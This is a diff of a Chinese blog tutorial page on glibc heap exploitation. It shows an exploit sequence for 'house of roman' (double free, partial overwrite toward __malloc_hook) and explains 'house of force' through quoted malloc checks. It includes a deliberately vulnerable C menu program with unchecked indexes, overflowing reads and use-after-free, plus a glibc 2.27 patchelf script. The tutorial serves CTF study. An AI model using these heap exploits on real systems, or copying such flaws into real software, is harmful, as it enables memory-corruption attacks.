@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="house of 系列 house of roman 这个主要是利用方法就是通过unsorted bin 的fd 的低两字节对glibc上的某个结构进行要给1/16的一个覆盖爆破这里我们要对这个攻击方式进行一个学习\n这里我们攻击流程和原理\n这个漏洞和我们的glibc的版本和源码无关，主要是利用pie保护的一个缺陷。\n因此我们的流程图是这样的\n这个就是整个数据结构的一个流程\n但是着我们要注意远程是否又开aslr的地址随机化。同时可以通过/proc/sys/kernel/randomize_va_space的值是可以控制的这里就要移步学习aslr相关的程序\n下面这一段就是他的一个核心代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 add_chunk(0, 0x68) add_chunk(1, 0x98) add_chunk(2, 0x68)#这个创建了三个堆块 delete_chunk(1)#这里吧chunk1给free掉是的他进入unsortbin add_chunk(3, 0x28)#这里分割出一个0x28大小的堆块，是的chunk1有0x68大小的堆使得它可以绕过fastbin的一个检查这里就要看fastbin attck add_chunk(1, 0x68) edit_chunk(1, p16(0xbaed))#这里这个数据是用来覆盖到mallod_hook的一个操作 delete_chunk(2)#double free delete_chunk(0) delete_chunk(2) add_chunk(0, 0x68) edit_chunk(0, p8(0xa0)) add_chunk(0, 0x68)#这里我们就可以指向0xa0方向的heap add_chunk(0, 0x68) add_chunk(0, 0x68) add_chunk(0, 0x68) house of force house of einherjar 这个攻击手法主要使用的一个技术手段就是heap overlapping的一个攻击手法，同时他的主要一个攻击手法就是使用的是在利用释放不在fast bin大小范围的chunk尝试和前面的chunk进行要给unlink的一个机制\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="house of 系列 house of roman 这个主要是利用方法就是通过unsorted bin 的fd 的低两字节对glibc上的某个结构进行要给1/16的一个覆盖爆破这里我们要对这个攻击方式进行一个学习\n这里我们攻击流程和原理\n这个漏洞和我们的glibc的版本和源码无关，主要是利用pie保护的一个缺陷。\n因此我们的流程图是这样的\n这个就是整个数据结构的一个流程\n但是着我们要注意远程是否又开aslr的地址随机化。同时可以通过/proc/sys/kernel/randomize_va_space的值是可以控制的这里就要移步学习aslr相关的程序\n下面这一段就是他的一个核心代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 add_chunk(0, 0x68) add_chunk(1, 0x98) add_chunk(2, 0x68)#这个创建了三个堆块 delete_chunk(1)#这里吧chunk1给free掉是的他进入unsortbin add_chunk(3, 0x28)#这里分割出一个0x28大小的堆块，是的chunk1有0x68大小的堆使得它可以绕过fastbin的一个检查这里就要看fastbin attck add_chunk(1, 0x68) edit_chunk(1, p16(0xbaed))#这里这个数据是用来覆盖到mallod_hook的一个操作 delete_chunk(2)#double free delete_chunk(0) delete_chunk(2) add_chunk(0, 0x68) edit_chunk(0, p8(0xa0)) add_chunk(0, 0x68)#这里我们就可以指向0xa0方向的heap add_chunk(0, 0x68) add_chunk(0, 0x68) add_chunk(0, 0x68) house of force 这个攻击手法主要就是通过篡改topchunk的size为一个很大的值可以绕过对用户请求大小和topchunk现有的size进行一个验证\n">
 <title>House_of_xxx</title>
 
 <link rel='canonical' href='https://Helios973.github.io/p/house_of_xxx/'>
 
 <link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="House_of_xxx">
-<meta property='og:description' content="house of 系列 house of roman 这个主要是利用方法就是通过unsorted bin 的fd 的低两字节对glibc上的某个结构进行要给1/16的一个覆盖爆破这里我们要对这个攻击方式进行一个学习\n这里我们攻击流程和原理\n这个漏洞和我们的glibc的版本和源码无关，主要是利用pie保护的一个缺陷。\n因此我们的流程图是这样的\n这个就是整个数据结构的一个流程\n但是着我们要注意远程是否又开aslr的地址随机化。同时可以通过/proc/sys/kernel/randomize_va_space的值是可以控制的这里就要移步学习aslr相关的程序\n下面这一段就是他的一个核心代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 add_chunk(0, 0x68) add_chunk(1, 0x98) add_chunk(2, 0x68)#这个创建了三个堆块 delete_chunk(1)#这里吧chunk1给free掉是的他进入unsortbin add_chunk(3, 0x28)#这里分割出一个0x28大小的堆块，是的chunk1有0x68大小的堆使得它可以绕过fastbin的一个检查这里就要看fastbin attck add_chunk(1, 0x68) edit_chunk(1, p16(0xbaed))#这里这个数据是用来覆盖到mallod_hook的一个操作 delete_chunk(2)#double free delete_chunk(0) delete_chunk(2) add_chunk(0, 0x68) edit_chunk(0, p8(0xa0)) add_chunk(0, 0x68)#这里我们就可以指向0xa0方向的heap add_chunk(0, 0x68) add_chunk(0, 0x68) add_chunk(0, 0x68) house of force house of einherjar 这个攻击手法主要使用的一个技术手段就是heap overlapping的一个攻击手法，同时他的主要一个攻击手法就是使用的是在利用释放不在fast bin大小范围的chunk尝试和前面的chunk进行要给unlink的一个机制\n">
+<meta property='og:description' content="house of 系列 house of roman 这个主要是利用方法就是通过unsorted bin 的fd 的低两字节对glibc上的某个结构进行要给1/16的一个覆盖爆破这里我们要对这个攻击方式进行一个学习\n这里我们攻击流程和原理\n这个漏洞和我们的glibc的版本和源码无关，主要是利用pie保护的一个缺陷。\n因此我们的流程图是这样的\n这个就是整个数据结构的一个流程\n但是着我们要注意远程是否又开aslr的地址随机化。同时可以通过/proc/sys/kernel/randomize_va_space的值是可以控制的这里就要移步学习aslr相关的程序\n下面这一段就是他的一个核心代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 add_chunk(0, 0x68) add_chunk(1, 0x98) add_chunk(2, 0x68)#这个创建了三个堆块 delete_chunk(1)#这里吧chunk1给free掉是的他进入unsortbin add_chunk(3, 0x28)#这里分割出一个0x28大小的堆块，是的chunk1有0x68大小的堆使得它可以绕过fastbin的一个检查这里就要看fastbin attck add_chunk(1, 0x68) edit_chunk(1, p16(0xbaed))#这里这个数据是用来覆盖到mallod_hook的一个操作 delete_chunk(2)#double free delete_chunk(0) delete_chunk(2) add_chunk(0, 0x68) edit_chunk(0, p8(0xa0)) add_chunk(0, 0x68)#这里我们就可以指向0xa0方向的heap add_chunk(0, 0x68) add_chunk(0, 0x68) add_chunk(0, 0x68) house of force 这个攻击手法主要就是通过篡改topchunk的size为一个很大的值可以绕过对用户请求大小和topchunk现有的size进行一个验证\n">
 <meta property='og:url' content='https://Helios973.github.io/p/house_of_xxx/'>
 <meta property='og:site_name' content='helios'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-06-06T17:22:45&#43;08:00'/><meta property='article:modified_time' content='2025-06-06T17:22:45&#43;08:00'/>
 <meta name="twitter:title" content="House_of_xxx">
-<meta name="twitter:description" content="house of 系列 house of roman 这个主要是利用方法就是通过unsorted bin 的fd 的低两字节对glibc上的某个结构进行要给1/16的一个覆盖爆破这里我们要对这个攻击方式进行一个学习\n这里我们攻击流程和原理\n这个漏洞和我们的glibc的版本和源码无关，主要是利用pie保护的一个缺陷。\n因此我们的流程图是这样的\n这个就是整个数据结构的一个流程\n但是着我们要注意远程是否又开aslr的地址随机化。同时可以通过/proc/sys/kernel/randomize_va_space的值是可以控制的这里就要移步学习aslr相关的程序\n下面这一段就是他的一个核心代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 add_chunk(0, 0x68) add_chunk(1, 0x98) add_chunk(2, 0x68)#这个创建了三个堆块 delete_chunk(1)#这里吧chunk1给free掉是的他进入unsortbin add_chunk(3, 0x28)#这里分割出一个0x28大小的堆块，是的chunk1有0x68大小的堆使得它可以绕过fastbin的一个检查这里就要看fastbin attck add_chunk(1, 0x68) edit_chunk(1, p16(0xbaed))#这里这个数据是用来覆盖到mallod_hook的一个操作 delete_chunk(2)#double free delete_chunk(0) delete_chunk(2) add_chunk(0, 0x68) edit_chunk(0, p8(0xa0)) add_chunk(0, 0x68)#这里我们就可以指向0xa0方向的heap add_chunk(0, 0x68) add_chunk(0, 0x68) add_chunk(0, 0x68) house of force house of einherjar 这个攻击手法主要使用的一个技术手段就是heap overlapping的一个攻击手法，同时他的主要一个攻击手法就是使用的是在利用释放不在fast bin大小范围的chunk尝试和前面的chunk进行要给unlink的一个机制\n">
+<meta name="twitter:description" content="house of 系列 house of roman 这个主要是利用方法就是通过unsorted bin 的fd 的低两字节对glibc上的某个结构进行要给1/16的一个覆盖爆破这里我们要对这个攻击方式进行一个学习\n这里我们攻击流程和原理\n这个漏洞和我们的glibc的版本和源码无关，主要是利用pie保护的一个缺陷。\n因此我们的流程图是这样的\n这个就是整个数据结构的一个流程\n但是着我们要注意远程是否又开aslr的地址随机化。同时可以通过/proc/sys/kernel/randomize_va_space的值是可以控制的这里就要移步学习aslr相关的程序\n下面这一段就是他的一个核心代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 add_chunk(0, 0x68) add_chunk(1, 0x98) add_chunk(2, 0x68)#这个创建了三个堆块 delete_chunk(1)#这里吧chunk1给free掉是的他进入unsortbin add_chunk(3, 0x28)#这里分割出一个0x28大小的堆块，是的chunk1有0x68大小的堆使得它可以绕过fastbin的一个检查这里就要看fastbin attck add_chunk(1, 0x68) edit_chunk(1, p16(0xbaed))#这里这个数据是用来覆盖到mallod_hook的一个操作 delete_chunk(2)#double free delete_chunk(0) delete_chunk(2) add_chunk(0, 0x68) edit_chunk(0, p8(0xa0)) add_chunk(0, 0x68)#这里我们就可以指向0xa0方向的heap add_chunk(0, 0x68) add_chunk(0, 0x68) add_chunk(0, 0x68) house of force 这个攻击手法主要就是通过篡改topchunk的size为一个很大的值可以绕过对用户请求大小和topchunk现有的size进行一个验证\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -327,7 +327,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 3 分钟
+                    阅读时长: 5 分钟
                 </time>
             </div>
         
@@ -428,7 +428,344 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="house-of-force">house of force
-</h2><h2 id="house-of-einherjar">house of einherjar
+</h2><p>这个攻击手法主要就是通过篡改topchunk的size为一个很大的值可以绕过对用户请求大小和topchunk现有的size进行一个验证</p>
+<p>先看一下现有的验证模式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 获取当前的top chunk，并计算其对应的大小
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">victim</span> <span class="o">=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">size</span> <span class="o">=</span> <span class="nf">chunksize</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span> <span class="o">+</span> <span class="n">MINSIZE</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">remainder_size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="n">nb</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">remainder</span> <span class="o">=</span> <span class="nf">chunk_at_offset</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span> <span class="o">=</span> <span class="n">remainder</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">set_head</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span> <span class="o">|</span> <span class="n">PREV_INUSE</span> <span class="o">|</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span> <span class="o">?</span> <span class="nl">NON_MAIN_ARENA</span> <span class="p">:</span> <span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">set_head</span><span class="p">(</span><span class="n">remainder</span><span class="p">,</span> <span class="n">remainder_size</span> <span class="o">|</span> <span class="n">PREV_INUSE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">check_malloced_chunk</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="nf">chunk2mem</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">alloc_perturb</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果用户请求的堆块大小不受限制就可以使得topchunk指向我们希望的任何位置。</p>
+<p>但是自2.29版本新增加了对top chunk size的合理性的检查，就失效了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">victim</span> <span class="o">=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">size</span> <span class="o">=</span> <span class="nf">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">system_mem</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;malloc(): corrupted top size&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>实例代码:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">chunk_list</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">menu</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;1. add chunk&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;2. delete chunk&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;3. edit chunk&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;4. show chunk&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;5. exit&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;choice:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="nf">get_num</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">num</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%llu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">num</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">num</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">add_chunk</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;index:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;size:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">delete_chunk</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;index:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">edit_chunk</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;index:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;length:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;content:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">show_chunk</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;index:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">menu</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">switch</span> <span class="p">(</span><span class="nf">get_num</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">add_chunk</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">delete_chunk</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">edit_chunk</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">show_chunk</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">default</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;invalid choice.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>patch.sh</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">VERSION</span><span class="o">=</span>2.27
+</span></span><span class="line"><span class="cl"><span class="nv">LIBC_NAME</span><span class="o">=</span>libc.so.6
+</span></span><span class="line"><span class="cl"><span class="nv">LD_NAME</span><span class="o">=</span>ld-linux-x86-64.so.2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gcc pwn.c -o pwn -g
+</span></span><span class="line"><span class="cl">cp /glibc/<span class="si">${</span><span class="nv">VERSION</span><span class="si">}</span>/amd64/lib/<span class="si">${</span><span class="nv">LIBC_NAME</span><span class="si">}</span> .
+</span></span><span class="line"><span class="cl">cp /glibc/<span class="si">${</span><span class="nv">VERSION</span><span class="si">}</span>/amd64/lib/<span class="si">${</span><span class="nv">LD_NAME</span><span class="si">}</span> .
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> <span class="si">${</span><span class="nv">LIBC_NAME</span><span class="si">}</span>
+</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> <span class="si">${</span><span class="nv">LD_NAME</span><span class="si">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">patchelf --replace-needed libc.so.6 ./<span class="si">${</span><span class="nv">LIBC_NAME</span><span class="si">}</span> ./pwn
+</span></span><span class="line"><span class="cl">patchelf --set-interpreter ./<span class="si">${</span><span class="nv">LD_NAME</span><span class="si">}</span> ./pwn
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里我们就要说明一下使用这个手法的坑了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-tex" data-lang="tex"><span class="line"><span class="cl">他对我们输入数据的类型有着一定的限制也就是他在get-num的时候的获取的类型需要为一个机器字长的数据如果他构造的是一个int也是不行的尤其是size位
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里使用一下他的具体代码实现</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
